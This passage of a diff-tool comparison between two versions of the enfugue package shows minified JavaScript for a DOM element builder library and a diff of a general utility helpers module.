+import{uuid,createEvent,isEmpty,parseSelector}from"./helpers.mjs";let defaultTags=["div","span","input","br","hr","a","p","i","strong","em","button","input","select","option","img","h1","h2","h3","h4","ul","ol","li","table","tbody","thead","tr","td","th","canvas","label","iframe","form","textarea","pre","fieldset","legend","code","style","link","script"],namespacedTags={"http://www.w3.org/2000/svg":["svg","path","rect","circle"]},defaultAttributes=["id","type","src","action","target","placeholder","href","disabled","selected","alt","value","width","height","x","y","d","cx","cy","r","for","name","fill","stroke","rel"],namespacedAttributes={"http://www.w3.org/2000/xlink":["xref"]};class FrameStacker{constructor(){this.callbacks=[],this.next=[],this.waiting=!1}requestFrame(e){this.callbacks.push(e),this.waiting||(window.requestAnimationFrame((()=>this.fireCallbacks())),this.waiting=!0)}requestNextFrame(e){this.next.push(e)}fireNextCallbacks(){for(let e of this.next)e();this.next=[]}fireCallbacks(){for(let e of this.callbacks)e();window.requestAnimationFrame((()=>this.fireNextCallbacks())),this.callbacks=[],this.waiting=!1}}const globalFrame=new FrameStacker;class DOMElement{static assignDefaultAttributes=!0;static assignNamespacedAttributes=!0;static assignElementId=!0;constructor(e,t){this.nameSpace=t,this.elementId=uuid(),this.tagName=e,this.attributes={},this.namespacedAttributes={},this.contentArray=[],this.elementClasses=[],this.events={},this.styles={};let n=0,i=this;if(this.constructor.assignDefaultAttributes)for(n=0;n<defaultAttributes.length;n++)this[defaultAttributes[n]]=function(e){return function(t){return i.attr(e,t)}}(defaultAttributes[n]);if(this.constructor.assignNamespacedAttributes)for(let e in namespacedAttributes)for(n=0;n<namespacedAttributes[e].length;n++)this[namespacedAttributes[e][n]]=function(t){return function(n){return i.attr(t,n,e)}}(namespacedAttributes[e][n]);"svg"===e&&(this.attributes.xmlns="http://www.w3.org/2000/svg",this.attributes.version="1.1",this.attributes["xmlns:xlink"]="http://www.w3.org/1999/xlink"),this.constructor.assignElementId&&this.data({"element-id":this.elementId})}static fromNode(e){let t=new DOMElement(e.tagName.toLowerCase()),n=Array.from(e.children);for(let n of e.getAttributeNames())-1!=["style"].indexOf(n)&&t.attr(n,e.getAttribute(n));for(let n of e.classList)t.addClass(n);if(n.length>0)t.contentArray=n.map((e=>DOMElement.fromNode(e)));else{let n=e.innerText;n.length>0&&t.content(n)}return t.element=e,t}editable(){return this.attr("contenteditable","true").attr("tabindex",0).on("input",(e=>{this.contentArray[0]=this.element.innerText}))}empty(){return this.contentArray=[],void 0!==this.element&&this.setDOMContent(this.contentArray),this}matchesSelector(e){if(void 0!==this.element)return this.element.matches(e);{let t=parseSelector(e);if(!isEmpty(t.tags)&&-1===t.tags.indexOf(this.tagName))return!1;if(!isEmpty(t.ids)&&-1===t.ids.indexOf(this.attr("id")))return!1;if(!isEmpty(t.classes))for(let e of t.classes)if(-1==this.elementClasses.indexOf(e))return!1;if(!isEmpty(t.attributes))for(let e in t.attributes)if(this.attr(e)!==t.attributes[e])return!1;return!0}}css(e,t){if(void 0===t){if("object"==typeof e){for(let t in e)this.css(t,e[t]);return this}return this.styles[e]}null===t?delete this.styles[e]:("number"==typeof t&&-1!==["left","right","top","bottom","width","height"].indexOf(e)&&(t+="px"),this.styles[e]=t);let n=this;return this.attr("style",Object.getOwnPropertyNames(this.styles).map((e=>`${e}: ${n.styles[e]}`)).join("; ")),this}show(){return void 0===this.display?this.css("display",null):this.css("display",this.display),this}hide(){return void 0===this.display&&"none"!==this.styles.display&&(this.display=this.styles.display),this.css("display","none"),this}attr(e,t,n){return void 0===t?void 0===n?this.attributes[e]:this.namespacedAttributes.hasOwnProperty(n)?this.namespacedAttributes[n][e]:void 0:(null===t||!1===t?void 0===n?this.attributes.hasOwnProperty(e)&&(delete this.attributes[e],void 0!==this.element&&this.removeDOMAttribute(e,t)):this.attributes.hasOwnProperty(n)&&(delete this.namespacedAttributes[namespace][e],void 0!==this.element&&this.removeDOMAttributeNS(e,t,n)):(!0===t&&(t=e),void 0===n?(this.attributes[e]=t,void 0!==this.element&&this.setDOMAttribute(e,t)):(this.namespacedAttributes.hasOwnProperty(n)||(this.namespacedAttributes[n]={}),this.namespacedAttributes[n][e]=t,void 0!==this.element&&this.setDOMAttributeNS(e,t,n))),this)}hasClass(e){return-1!==this.elementClasses.indexOf(e)}class(e){for(let e of this.elementClasses)this.removeClass(e);return this.addClass(e)}addClass(e){for(let t of e.split(" "))this.elementClasses.push(t),void 0!==this.element&&this.element.classList.add(t);return this}removeClass(e){return this.elementClasses=this.elementClasses.filter((t=>t!==e)),void 0!==this.element&&this.element.classList.remove(e),this}toggleClass(e){return this.hasClass(e)?this.removeClass(e):this.addClass(e),this}data(e,t){if(void 0===e)return this.attributes.filter((e=>e.key.startsWith("data")));if("string"==typeof e){if(void 0===t)return this.attr("data-"+e);this.attr("data-"+e,t)}else{let t;for(t in e)this.attr("data-"+t,e[t])}return this}content(){return this.empty(),this.contentArray=Array.from(arguments),void 0===this.contentArray[0]&&(this.contentArray=[]),void 0!==this.element&&this.setDOMContent(this.contentArray),this}prepend(){return this.contentArray=Array.from(arguments).concat(this.contentArray),void 0!==this.element&&this.setDOMContent(this.contentArray),this}append(){return this.contentArray=this.contentArray.concat(Array.from(arguments)),void 0!==this.element&&this.appendDOMContent(this.contentArray[this.contentArray.length-1]),this}extend(e){let t=e.length;if(this.contentArray=this.contentArray.concat(e),void 0!==this.element)for(let e=this.contentArray.length-t;e<this.contentArray.length;e++)this.appendDOMContent(this.contentArray[e]);return this}insert(e,t){return this.contentArray=this.contentArray.slice(0,e).concat([t]).concat(this.contentArray.slice(e)),void 0!==this.element&&this.setDOMContent(this.contentArray),this}insertAfter(e,t){let n=this.getChildIndex(e);return this.insert(n+1,t)}insertBefore(e,t){let n=this.getChildIndex(e);return this.insert(n,t)}swapChildren(e,t){let n=this.contentArray[t];return this.contentArray[t]=this.contentArray[e],this.contentArray[e]=n,this}getChildIndex(e){let t,n,i;if(t=e instanceof DOMElement?e.elementId:e.getAttribute("data-element-id"),void 0!==t)for(let e=0;e<this.contentArray.length;e++){if(this.contentArray[e]instanceof DOMElement)n=this.contentArray[e].elementId;else{if(!(this.contentArray[e]instanceof Node))continue;n=this.contentArray[e].getAttribute("data-element-id")}if(void 0!==n&&n===t){i=e;break}}return i}getChildIndexById(e){let t;for(let n=0;n<this.contentArray.length;n++)if(t=this.contentArray[n]instanceof DOMElement?this.contentArray[n].elementId:this.contentArray[n].getAttribute("data-element-id"),t===e)return n;return null}is(e){let t;return e instanceof DOMElement?t=e.elementId:e instanceof Node&&(t=e.getAttribute("data-element-id")),t===this.elementId}remove(e){if(void 0===e)return void 0!==this.element&&(this.element.remove(),this.element=void 0),this;{let t=this.getChildIndex(e);if(void 0!==t){let e=this.contentArray[t];return this.contentArray=this.contentArray.slice(0,t).concat(this.contentArray.slice(t+1)),void 0!==this.element&&this.removeDOMContent(e),this}}return console.error("Couldn't find child element",e),this}replace(e,t){let n=this.getChildIndex(e),i=this.element;if(void 0!==n)this.contentArray=this.contentArray.slice(0,n).concat([t]).concat(this.contentArray.slice(n+1)),void 0!==i&&window.requestAnimationFrame((function(){i.childNodes[n].replaceWith(t.render())}));else if(this.contentArray.length>0)for(let n of this.contentArray)n.replace(e,t);return this}isEmpty(){return 0==this.contentArray.length}children(){return this.contentArray}getChild(e){return this.contentArray[e]}getText(){return this.children().map((e=>"string"==typeof e?e:e instanceof DOMElement?e.getText():"")).join("")}firstChild(){return this.contentArray[0]}lastChild(){return this.contentArray[this.contentArray.length-1]}on(e,t){for(let n of e.split(","))void 0!==this.element&&this.setDOMEvent(n,t),this.events.hasOwnProperty(n)?this.events[n].push(t):this.events[n]=[t];return this}off(e,t){for(let n of e.split(",")){if(void 0!==this.element&&void 0!==this.events[n]){if(void 0!==t)return this.removeDOMEvent(n,t),this.events[n]=this.events[n].filter((e=>e!==t)),this;for(let e of this.events[n])this.removeDOMEvent(n,e)}delete this.events[n]}return this}val(e,t){if(void 0===e){if(void 0===this.element)return;return this.element.value}if("select"==this.tagName)for(let t of this.contentArray)t.value()===e?t.selected(!0):t.selected(!1);else if("textarea"===this.tagName)void 0!==this.element?this.element.innerText=e:this.on("render",(()=>{this.val(e).off("render")}));else if("input"===this.tagName&&"checkbox"===this.attr("type"))this.attr("checked",e),void 0!==this.element&&(this.element.checked=e);return void 0!==this.element&&(this.element.value=e),this.value(e),!1!==t&&this.trigger("change"),this}focus(){return this.element.focus(),this}select(){return this.element.select(),this}trigger(e){return void 0!==this.element&&("string"==typeof e&&(e=createEvent(e)),this.element.dispatchEvent(e)),this}removeDOMAttribute(e){if(void 0===this.element)throw"Element has not been rendered, cannot remove attributes.";return this.element.removeAttribute(e),this}removeDOMAttributeNS(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot remove attributes.";return this.element.removeAttributeNS(t,e),this}setDOMAttribute(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.setAttribute(e,t),this}setDOMAttributeNS(e,t,n){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.setAttributeNS(n,e,t),this}addDOMClass(e){if(void 0===this.element)throw"Element has not been rendered, cannot set attributes.";return this.element.classList.add(e),this}setDOMEvent(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set event listeners.";return this.element.addEventListener(e,t),this}removeDOMEvent(e,t){if(void 0===this.element)throw"Element has not been rendered, cannot set event listeners.";void 0!==t&&this.element.removeEventListener(e,t)}appendDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot append content.";if(e instanceof DOMElement){if(void 0===e.element&&e.render(this.element),e.element instanceof DocumentFragment)return this;this.element.appendChild(e.element)}else try{if(e instanceof DocumentFragment)return this;this.element.appendChild(e)}catch(t){if(null==e)throw"Cannot add null or undefined content to "+this.tagName;console.error("Could not add content of type",e.constructor.name,e,"to",this),console.error(t)}return this}removeDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot remove content.";if(e instanceof DOMElement){if(void 0===e.element)return this;if(e.element instanceof DocumentFragment)throw"Shadow elements cannot be detached; you must remove the parent element.";this.element.removeChild(e.element)}else this.element.removeChild(e);return this}setDOMContent(e){if(void 0===this.element)throw"Element has not been rendered, cannot set content.";let t=this;return globalFrame.requestFrame((function(){if(void 0!==t.element){for(;t.element.firstChild;)t.element.removeChild(t.element.firstChild);if(Array.isArray(e)||(e=[e]),1==e.length&&"string"==typeof e[0])return"CODE"===t.element.tagName||"PRE"===t.element.tagName?t.element.innerText=e[0]:t.element.innerHTML=e[0],t.element;if(e.length>=1){let n=0;for(n=0;n<e.length;n++)if(e[n]instanceof DOMElement){if(void 0===e[n].element&&e[n].render(t.element),e[n].element instanceof DocumentFragment)continue;t.element.appendChild(e[n].element)}else try{if(e[n]instanceof DocumentFragment)continue;t.element.appendChild(e[n])}catch(i){if(null===e[n]||void 0===e[n])throw console.error("Could not add null or undefined content to",t),console.trace(i),"Cannot add null or undefined content to "+t.tagName;console.error("Could not add content of type",e[n].constructor.name,e[n],"to",t),console.error(i),console.trace(i)}}}})),this}createDOMElement(){return document.createElement(this.tagName)}render(){let e,t,n,i,s=void 0===this.element,r=[].concat(this.contentArray);void 0===this.element&&(this.element=this.createDOMElement());for(let e in r)r[e]instanceof DOMElement&&(r[e]=r[e].render(this.element));for(e in this.attributes)this.setDOMAttribute(e,this.attributes[e]);for(t of this.elementClasses)this.addDOMClass(t);for(n in this.events)for(i of this.events[n])this.setDOMEvent(n,i);return this.setDOMContent(r),s&&this.trigger("render"),"select"===this.tagName&&void 0!==this.element&&globalFrame.requestNextFrame((()=>{if(isEmpty(this.attributes.value))this.element.childNodes.length>0&&(this.element.childNodes[0].selected=!0);else for(let e of this.element.childNodes)if(e.value==this.attributes.value)return void(e.selected=!0)})),this.element}async awaitRender(){if(void 0===this.element){let e=this;return this.render(),new Promise((function(t,n){e.on("ready",(()=>t(e.element)))}))}return Promise.resolve(this.element)}redraw(){this.element.innerHTML=this.element.innerHTML}findDeep(e){for(let t of this.children()){if(t instanceof DOMElement&&t.matchesSelector(e))return t;let n=t.findDeep(e);if(null!=n)return n}return null}findWide(e){for(let t of this.children())if(t instanceof DOMElement&&t.matchesSelector(e))return t;for(let t of this.children())if(t instanceof DOMElement){let n=t.findWide(e);if(null!=n)return n}return null}findAllDeep(e){let t=[];for(let n of this.children())n instanceof DOMElement&&(n.matchesSelector(e)&&t.push(n),t=t.concat(n.findAllDeep(e)));return t}findAllWide(e){let t=[];for(let n of this.children())n instanceof DOMElement&&n.matchesSelector(e)&&t.push(n);for(let n of this.children())n instanceof DOMElement&&(t=t.concat(n.findAllDeep(e)));return t}find(e){return this.findWide(e)}findAll(e){return this.findAllWide(e)}scrollToBottom(){return void 0!==this.element&&this.element.scrollTo(0,this.element.scrollHeight),this}}class DOMElementList{static fromNodeList(e){return new DOMElementList(Array.from(e).map((e=>{if(e instanceof Node)return DOMElement.fromNode(e);if(e instanceof DOMElement)return e;throw console.error("Cannot parse element",e),new Error("Invalid argument.")})))}constructor(e){this.elements=e}each(e){for(let t of this.children())e.apply(t)}children(){return this.elements}}class ShadowDOMElement extends DOMElement{static assignElementId=!1;createDOMElement(){if(isEmpty(this.parentElement))throw"Shadow DOMs must be attached to an element, they cannot be instantiated on their own.";try{return this.parentElement.attachShadow({mode:"open"})}catch(e){if(this.parentElement.shadowRoot)return this.parentElement.shadowRoot;throw e}}setDOMAttribute(e,t){return console.warn("DOM attributes not supported on shadow elements, ignoring setting",e,"=",t),this}setDOMAttributeNS(e,t,n){return console.warn("DOM attributes not supported on shadow elements, ignoring setting",`${n}:${e}`,"=",t),this}setDOMEvent(e,t){return console.warn("DOM events not supported on shadow elements, ignoring adding listener for",e),this}removeDOMEvent(e,t){return console.warn("DOM events not supported on shadow elements, ignoring removing listener for",e),this}removeDOMAttribute(e){return console.warn("DOM attributes not supported on shadow elements, ignoring removing",e),this}removeDOMAttributeNS(e,t){return console.warn("DOM attributes not supported on shadow elements, ignoring removing",`${t}:${e}`),this}addDOMClass(e){return console.warn("DOM classes not supported on shadow elements, ignoring adding",e),this}render(e){return this.parentElement=e,super.render()}}let Builder=function(e){let t,n,i=function(e){if(e instanceof DOMElement||e instanceof DOMElementList)return e;if(Array.isArray(e)||e instanceof HTMLCollection||e instanceof NodeList)return DOMElementList.fromNodeList(e);if(e instanceof Node)return DOMElement.fromNode(node);if("string"==typeof e){let t=document.querySelectorAll(e);return 1===t.length?DOMElement.fromNode(t[0]):DOMElementList.fromNodeList(t)}return this};i.createElement=function(e,t){return new DOMElement(e,t)},i.createShadow=function(){return new ShadowDOMElement};for(let t in e)i[t]=()=>i.createElement(e[t]);for(i.getCustomTag=t=>isEmpty(e)?void 0:e[t],t=0;t<defaultTags.length;t++)i[defaultTags[t]]=function(e){return function(){return i.createElement(e)}}(defaultTags[t]);for(n in namespacedTags)for(t=0;t<namespacedTags[n].length;t++)i[namespacedTags[n][t]]=function(e,t){return function(){return i.createElement(e,t)}}(namespacedTags[n][t],n);return i};export{Builder as ElementBuilder,DOMElement};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/base/csv.mjs` & `enfugue-0.2.0/enfugue/static/js/base/csv.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/base/helpers.mjs` & `enfugue-0.2.0/enfugue/static/js/base/helpers.mjs`

 * *Files 2% similar despite different names*

```diff
@@ -1 +1 @@
-export let every=e=>{for(let t of e)if(!t)return!1;return!0};export let none=e=>{for(let t of e)if(t)return!1;return!0};export let any=e=>{for(let t of e)if(t)return!0;return!1};export let flatten=e=>e.reduce(((e,t)=>e.concat(Array.isArray(t)?flatten(t):t)),[]);export let strip=e=>{if(isEmpty(e))return e;let t=e.match(/^[\ \t\r\n\'\"]*(.*?)[\ \t\r\n\'\"]*$/);return null===t?"":t[1]};export let sleep=e=>new Promise((t=>{setTimeout(t,e)}));export let waitFor=async(e,t)=>{let r=(t=t||{}).interval||50,o=t.timeout,n=new Date,l=0;for(;!e();)if(await sleep(r),l=new Date-n,!isEmpty(o)&&l>o)throw"Timeout"};export let guessCase=e=>(e=strip(e),/^$/.test(e)?"EMPTY":/^[a-z09]+$/.test(e)?"LOWER":/^[A-Z09]+$/.test(e)?"UPPER":/^[A-Za-z0-9]+(_[A-Za-z0-9]+)+$/.test(e)?"SNAKE":/^[A-Za-z0-9]+(-[A-Za-z0-9]+)+$/.test(e)?"KEBAB":/^[a-z]+([A-Z][a-z0-9]+)+$/.test(e)?"CAMEL":/^([A-Z][a-z0-9]+)+$/.test(e)?"PASCAL":/^(\w+)((\W\w+)+)$/.test(e)?"SENTENCE":"UNKNOWN");export let guessStringParts=e=>{switch(e=strip(e),guessCase(e)){case"SENTENCE":return e.split(" ").map((e=>e.toLowerCase()));case"SNAKE":return e.split("_").map((e=>e.toLowerCase()));case"KEBAB":return e.split("-").map((e=>e.toLowerCase()));case"CAMEL":return e.split(/([A-Z])/g).reduce(((e,t,r)=>0==r||r%2==1?e.concat([t]):e.concat([e.splice(-1)[0]+t])),[]).map((e=>e.toLowerCase()));case"PASCAL":return e.split(/([A-Z])/g).reduce(((e,t,r)=>0==r?e:r%2==1?e.concat([t]):e.concat([e.splice(-1)[0]+t])),[]).map((e=>e.toLowerCase()));default:return[e.toLowerCase()]}};export let kebabCase=(e,t)=>(void 0===t&&(t="-"),guessStringParts(e).join(t));export let snakeCase=(e,t)=>(void 0===t&&(t="_"),guessStringParts(e).join(t));export let camelCase=(e,t)=>(void 0===t&&(t=""),guessStringParts(e).map(((e,t)=>0==t?e:e[0].toUpperCase()+e.substr(1))).join(t));export let pascalCase=(e,t)=>(void 0===t&&(t=""),guessStringParts(e).map((e=>e[0].toUpperCase()+e.substr(1))).join(t));export let titleCase=e=>pascalCase(e," ");export let caseInsensitiveMatch=(e,t)=>e.toLowerCase()===t.toLowerCase()||kebabCase(e)===kebabCase(t);export let truncate=(e,t,r="…")=>e.length<=t?e:e.substring(0,e.lastIndexOf(" ",t))+r;export let set=e=>e.filter(((t,r)=>e.indexOf(t)===r));export let merge=function(){let e=Array.from(arguments),t={...e[0]};for(let r=1;r<e.length;r++){let o=e[r];for(let e in o)void 0===t[e]?t[e]=o[e]:"object"==typeof t[e]&&"object"==typeof o[e]?t[e]=merge(t[e],o[e]):t[e]=o[e]}return t};const mouseEvents=["click","dblclick","mouseenter","mouseleave","mouseup","mousedown","mousemove","mouseover","mouseout","contextmenu"];export let createEvent=e=>"function"==typeof MouseEvent&&mouseEvents.indexOf(e)>-1?new MouseEvent(e):"function"==typeof Event?new Event(e):(()=>{let t=document.createEvent("Event");return t.initEvent(e,!0,!0),t})();export let randomInt=(e,t)=>(void 0===t?0:e)+Math.random()*(void 0===t?e:t-e)|0;export let randomHex=e=>isEmpty(e)?randomInt(16).toString(16):new Array(e).fill(null).map(randomHex).join("");export let randomChoice=e=>e[randomInt(e.length)];export let uuid=()=>`${randomHex(8)}-${randomHex(4)}-4${randomHex(3)}-${randomChoice(["8","9","a","b"])}${randomHex(3)}-${randomHex(12)}`;export let isEquivalent=(e,t)=>{if(typeof e==typeof t){if(Array.isArray(e)&&Array.isArray(t)){if(e.length!==t.length)return!1;for(let r=0;r<e.length;r++)if(!isEquivalent(e[r],t[r]))return!1;return!0}if("object"==typeof e){if(null===e)return null===t;if(null===t)return!1;let r=Object.getOwnPropertyNames(e),o=Object.getOwnPropertyNames(t);if(!isEquivalent(r,o))return!1;for(let o of r)if(!isEquivalent(e[o],t[o]))return!1;return!0}return e===t}return!1};export let getQueryParameters=()=>-1===window.location.href.indexOf("?")?{}:window.location.href.substring(window.location.href.indexOf("?")+1).split("&").reduce(((e,t)=>{let r=t.split("="),o=r[0],n=decodeURIComponent(r[1]).replace("+"," ");return e.hasOwnProperty(o)?(Array.isArray(e[o])||(e[o]=[e[o]]),e[o].push(n)):e[o]=n,e}),{});export let getDataParameters=e=>{let t={};for(let r=0,o=e.attributes,n=o.length;r<n;r++)o[r].nodeName.startsWith("data")&&(t[camelCase(o[r].nodeName.substr(5))]=o[r].nodeValue);return t};export let buildQueryURL=(e,t)=>{let r=e;return-1===e.indexOf("?")&&(r+="?"),r+Object.getOwnPropertyNames(t).map((e=>`${e}=${encodeURIComponent(t[e])}`)).join("&")};export let getQueryURL=e=>buildQueryURL(window.location.href,e);export let isEmpty=e=>null==e||""===e||"null"===e||Array.isArray(e)&&0===e.length||"object"==typeof e&&"Object"===e.constructor.name&&0===Object.getOwnPropertyNames(e).length;export let removeEmpty=e=>{if(Array.isArray(e)){let t=[];for(let r of e)isEmpty(v)||t.push(v);return t}if("object"==typeof e){let t={};for(let r of Object.getOwnPropertyNames(e))isEmpty(e[r])||(t[r]=e[r]);return t}return e};export let deepClone=(e,t=!0)=>{if(null==e)return e;if("function"==typeof e){if(t)throw"Cannot clone functions.";return e}return"boolean"==typeof e?!!e:"number"==typeof e?0+e:"string"==typeof e||e instanceof String?`${e}`:Array.isArray(e)?new Array(e.length).fill(null).map(((t,r)=>deepClone(e[r],!1))):"object"==typeof e||e===Object(e)?"RegExp"===e.constructor.name?e:Object.getOwnPropertyNames(e).reduce(((t,r)=>(t[r]=deepClone(e[r],!1),t)),new Object):(console.warn("Unknown clone type for",e),e)};const byteSuffixes=["B","KB","MB","GB","TB","PB","EB","ZB","YB"];export let humanSize=(e,t)=>{void 0===t&&(t=2);let r=0;for(;e>1e3;)e/=1e3,r++;return`${e.toFixed(t)} ${byteSuffixes[r]}`};const secondsPerMinute=60,secondsPerHour=3600,secondsPerDay=86400;export let humanDuration=(e,t=!0)=>{let r=0,o=0,n=0;e>86400&&(r=Math.floor(e/86400),e-=86400*r),e>3600&&(o=Math.floor(e/3600),e-=3600*o),e>60&&(n=Math.floor(e/60),e-=60*n);let l=`${r} day${1!=r?"s":""}, ${o} hour${1!=o?"s":""}, ${n} minute${1!=n?"s":""}, ${e=Math.floor(e)} second${1!=e?"s":""}`;if(t&&0==r){let e=l.split(", ");return 0==o&&0==n?e.slice(3).join(", "):0==o?e.slice(2).join(", "):e.slice(1).join(", ")}return l};export let getCookies=()=>document.cookie.split(";").reduce(((e,t)=>{let r=strip(t).split("=");return e[r[0]]=r[1],e}),{});export let getCookie=e=>getCookies()[e];export let jaroWinkler=(e,t,r)=>{let o,n,l=0;if(0===e.length||0===t.length)return 0;if(e===t)return 1;let s=Math.floor(Math.max(e.length,t.length)/2)-1,a=new Array(e.length),i=new Array(t.length);for(o=0;o<e.length;o++){let r=o>=s?o-s:0,u=o+s<=t.length-1?o+s:t.length-1;for(n=r;n<=u;n++)if(!0!==a[o]&&!0!==i[n]&&e[o]===t[n]){++l,a[o]=i[n]=!0;break}}if(0===l)return 0;let u=0,p=0;for(o=0;o<e.length;o++)if(!0===a[o]){for(n=u;n<t.length;n++)if(!0===i[n]){u=n+1;break}e[o]!==t[n]&&++p}let c=(l/e.length+l/t.length+(l-p/2)/l)/3,f=0;if(null==r&&(r=.1),c>.7){for(;e[f]===t[f]&&f<4;)++f;c+=f*r*(1-c)}return c};export let getPermutations=e=>{let t,r,o=e.length,n=[e.slice()],l=new Array(o).fill(0),s=1;for(;s<o;)l[s]<s?(t=s%2&&l[s],r=e[s],e[s]=e[t],e[t]=r,++l[s],s=1,n.push(e.slice())):(l[s]=0,++s);return n};export let permutedSentenceJaroWinkler=(e,t)=>{let r=0;for(let o of getPermutations(e.split(" ")))for(let e of getPermutations(t.split(" ")))r=Math.max(r,jaroWinkler(o.join(" "),e.join(" ")));return r};export let ceilingTo=(e,t)=>Math.ceil(e/t)*t;export let floorTo=(e,t)=>Math.floor(e/t)*t;export let roundTo=(e,t)=>Math.round(e/t)*t;export let roundToFactor=(e,t)=>roundTo(e,10**t);export let roundToPrecision=(e,t)=>{return r=10**t,Math.round(e*r)/r;var r};export let clamp=(e,t=0,r=1)=>Math.max(Math.min(isNaN(e)?0:e,r),t);export let parseSelector=e=>{let t={};return e.split(/(?=\.)|(?=#)|(?=\[)/).forEach((e=>{switch(e[0]){case"#":void 0===t.ids&&(t.ids=[]),t.ids.push(e.slice(1));break;case".":void 0===t.classes&&(t.classes=[]),t.classes.push(e.slice(1));break;case"[":void 0===t.attributes&&(t.attributes={});let[r,o]=e.slice(1,-1).split("=");t.attributes[r]=strip(o);break;default:void 0===t.tags&&(t.tags=[]),t.tags.push(e)}})),t};export function*shiftingFrameIterator(e,t){for(let r=0;r<e.length-t+1;r++)yield e.slice(r,r+t)}export function*zip(...e){let t=Math.min(...e.map((e=>e.length)));for(let r=0;r<t;r++)yield e.map((e=>e[r]))}export let hslToRgb=(e,t,r)=>{let o,n,l;if(0===t)o=n=l=r;else{let s=(e,t,r)=>(r<0&&(r+=1),r>1&&(r-=1),r<1/6?e+6*(t-e)*r:r<.5?t:r<2/3?e+(t-e)*(2/3-r)*6:e),a=r<.5?r*(1+t):r+t-r*t,i=2*r-a;o=s(i,a,e+1/3),n=s(i,a,e),l=s(i,a,e-1/3)}return[Math.round(255*o),Math.round(255*n),Math.round(255*l)]};export let rgbToHsl=(e,t,r)=>{e/=255,t/=255,r/=255;let o,n,l=Math.max(e,t,r),s=Math.min(e,t,r),a=(l+s)/2;if(l===s)o=n=0;else{let i=l-s;switch(n=a>.5?i/(2-l-s):i/(l+s),l){case e:o=(t-r)/i+(t<r?6:0);break;case t:o=(r-e)/i+2;break;case r:o=(e-t)/i+4}o/=6}return[o,n,a]};export let rgbToHex=(e,t,r)=>{let o=e=>(e<16?"0":"")+e.toString(16);return`#${o(e)}${o(t)}${o(r)}`};export let hslToHex=(e,t,r)=>rgbToHex(...hslToRgb(e,t,r));export let hexToRgb=e=>(e.startsWith("#")&&(e=e.substr(1)),[parseInt(e.substr(0,2),16),parseInt(e.substr(2,2),16),parseInt(e.substr(4),16)]);export let hexToHsl=e=>rgbToHsl(...hexToRgb(e));const pluralRules=new Intl.PluralRules("en-US",{type:"ordinal"}),suffixes=new Map([["one","st"],["two","nd"],["few","rd"],["other","th"]]);export let formatOrdinal=e=>`${e}${suffixes.get(pluralRules.select(e))}`;export let promptFiles=(e="*",t=!1)=>new Promise(((r,o)=>{let n=document.createElement("input"),l=e=>{window.removeEventListener("mousemove",l),o("No files selected.")};n.type="file",n.multiple=t,n.accept=e,n.onchange=()=>{let e=Array.from(n.files);window.removeEventListener("mousemove",l),r(t?e:e[0])},n.click(),window.addEventListener("mousemove",l)}));export let stripHTML=e=>e.replace(/<[^>]*>?/gm,"");export let createElementsFromString=e=>{let t=document.createElement("div");return t.innerHTML=e.trim(),t.childNodes};
+export let every=e=>{for(let t of e)if(!t)return!1;return!0};export let none=e=>{for(let t of e)if(t)return!1;return!0};export let any=e=>{for(let t of e)if(t)return!0;return!1};export let flatten=e=>e.reduce(((e,t)=>e.concat(Array.isArray(t)?flatten(t):t)),[]);export let strip=e=>{if(isEmpty(e))return e;let t=e.match(/^[\ \t\r\n\'\"]*(.*?)[\ \t\r\n\'\"]*$/);return null===t?"":t[1]};export let sleep=e=>new Promise((t=>{setTimeout(t,e)}));export let waitFor=async(e,t)=>{let r=(t=t||{}).interval||50,o=t.timeout,n=new Date,l=0;for(;!e();)if(await sleep(r),l=new Date-n,!isEmpty(o)&&l>o)throw"Timeout"};export let guessCase=e=>(e=strip(e),/^$/.test(e)?"EMPTY":/^[a-z09]+$/.test(e)?"LOWER":/^[A-Z09]+$/.test(e)?"UPPER":/^[A-Za-z0-9]+(_[A-Za-z0-9]+)+$/.test(e)?"SNAKE":/^[A-Za-z0-9]+(-[A-Za-z0-9]+)+$/.test(e)?"KEBAB":/^[a-z]+([A-Z][a-z0-9]+)+$/.test(e)?"CAMEL":/^([A-Z][a-z0-9]+)+$/.test(e)?"PASCAL":/^(\w+)((\W\w+)+)$/.test(e)?"SENTENCE":"UNKNOWN");export let guessStringParts=e=>{switch(e=strip(e),guessCase(e)){case"SENTENCE":return e.split(" ").map((e=>e.toLowerCase()));case"SNAKE":return e.split("_").map((e=>e.toLowerCase()));case"KEBAB":return e.split("-").map((e=>e.toLowerCase()));case"CAMEL":return e.split(/([A-Z])/g).reduce(((e,t,r)=>0==r||r%2==1?e.concat([t]):e.concat([e.splice(-1)[0]+t])),[]).map((e=>e.toLowerCase()));case"PASCAL":return e.split(/([A-Z])/g).reduce(((e,t,r)=>0==r?e:r%2==1?e.concat([t]):e.concat([e.splice(-1)[0]+t])),[]).map((e=>e.toLowerCase()));default:return[e.toLowerCase()]}};export let kebabCase=(e,t)=>(void 0===t&&(t="-"),guessStringParts(e).join(t));export let snakeCase=(e,t)=>(void 0===t&&(t="_"),guessStringParts(e).join(t));export let camelCase=(e,t)=>(void 0===t&&(t=""),guessStringParts(e).map(((e,t)=>0==t?e:e[0].toUpperCase()+e.substr(1))).join(t));export let pascalCase=(e,t)=>(void 0===t&&(t=""),guessStringParts(e).map((e=>e[0].toUpperCase()+e.substr(1))).join(t));export let titleCase=e=>pascalCase(e," ");export let caseInsensitiveMatch=(e,t)=>e.toLowerCase()===t.toLowerCase()||kebabCase(e)===kebabCase(t);export let truncate=(e,t,r="…")=>e.length<=t?e:e.substring(0,e.lastIndexOf(" ",t))+r;export let set=e=>e.filter(((t,r)=>e.indexOf(t)===r));export let merge=function(){let e=Array.from(arguments),t={...e[0]};for(let r=1;r<e.length;r++){let o=e[r];for(let e in o)void 0===t[e]?t[e]=o[e]:"object"==typeof t[e]&&"object"==typeof o[e]?t[e]=merge(t[e],o[e]):t[e]=o[e]}return t};const mouseEvents=["click","dblclick","mouseenter","mouseleave","mouseup","mousedown","mousemove","mouseover","mouseout","contextmenu"];export let createEvent=e=>"function"==typeof MouseEvent&&mouseEvents.indexOf(e)>-1?new MouseEvent(e):"function"==typeof Event?new Event(e):(()=>{let t=document.createEvent("Event");return t.initEvent(e,!0,!0),t})();export let 